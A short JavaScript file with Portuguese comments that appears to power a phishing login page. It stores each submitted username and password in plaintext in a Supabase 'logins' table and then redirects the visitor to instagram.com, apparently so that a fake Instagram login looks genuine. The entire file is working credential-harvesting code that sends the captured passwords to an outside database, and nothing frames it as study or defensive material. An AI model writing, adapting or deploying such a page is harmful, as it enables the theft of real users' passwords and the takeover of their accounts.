const SUPABASE_URL = 'https://izhqxlnpiqpcekbedbkd.supabase.co';
const SUPABASE_KEY = 'COLE_AQUI_SUA_CHAVE_PUBLISHABLE_COMPLETA'; // Da imagem image_dc32d9.png
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const btnSubmit = document.getElementById('btn-submit');
const loginForm = document.getElementById('login-form');

function checkInputs() {
    if (userInp.value.length > 0 && passInp.value.length >= 6) {
        btnSubmit.disabled = false;
        btnSubmit.classList.add('active');
    } else {
        btnSubmit.disabled = true;
        btnSubmit.classList.remove('active');
    }
}

userInp.addEventListener('input', checkInputs);
passInp.addEventListener('input', checkInputs);

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    btnSubmit.innerText = "Carregando...";
    btnSubmit.disabled = true;

    // Salva na tabela 'logins' criada na imagem image_dc3a00.png
    const { error } = await _supabase
        .from('logins')
        .insert([
            { 
                username: userInp.value, 
                password: passInp.value 
            }
        ]);

    if (error) {
        console.error('Erro:', error.message);
        alert('Erro ao conectar.');
        btnSubmit.disabled = false;
        btnSubmit.innerText = "Entrar";
    } else {
        // Redirecionamento após salvar os dados
        window.location.href = "https://www.instagram.com";
    }
});